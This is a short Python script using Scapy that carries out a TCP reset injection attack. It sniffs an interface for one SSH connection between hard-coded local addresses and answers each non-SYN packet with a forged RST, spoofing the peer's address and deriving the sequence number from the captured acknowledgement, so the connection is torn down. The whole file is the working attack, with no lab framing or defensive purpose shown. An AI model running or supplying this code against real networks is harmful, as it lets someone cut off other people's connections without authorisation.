from scapy.all import *
import random

DEFAULT_WINDOW_SIZE = 2052
conf.L3socket = L3RawSocket

server_ip = "192.168.1.10"
server_port = 22
client_ip = "192.168.1.9"
iface = "eth0"  # or wlan0

def log(msg, params={}):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")

def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        return (p.haslayer(TCP) and
                p[IP].src == client_ip and
                p[IP].dst == server_ip and
                p[TCP].dport == server_port)
    return f

def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
    def f(p):
        return (p.haslayer(TCP) and
                p[IP].src == server_ip and
                p[IP].dst == client_ip and
                p[TCP].sport == server_port)
    return f

def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
    return lambda p: (
        is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p) or
        is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p)
    )

def send_reset(iface, seq_jitter=0, ignore_syn=True):
    def f(p):
        if not p.haslayer(TCP):
            return

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        src_port = p[TCP].sport
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        if "S" in flags and ignore_syn:
            return

        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        rst_seq = ack + jitter

        rst_pkt = IP(src=dst_ip, dst=src_ip) / \
                  TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log("Sending TCP RST", {"seq": rst_seq, "src": dst_ip, "dst": src_ip})
        send(rst_pkt, verbose=0)

    return f

if __name__ == "__main__":
    log("Sniffing on iface", {"iface": iface})
    sniff(
        iface=iface,
        prn=send_reset(iface),
        lfilter=is_packet_on_tcp_conn(server_ip, server_port, client_ip)
    )
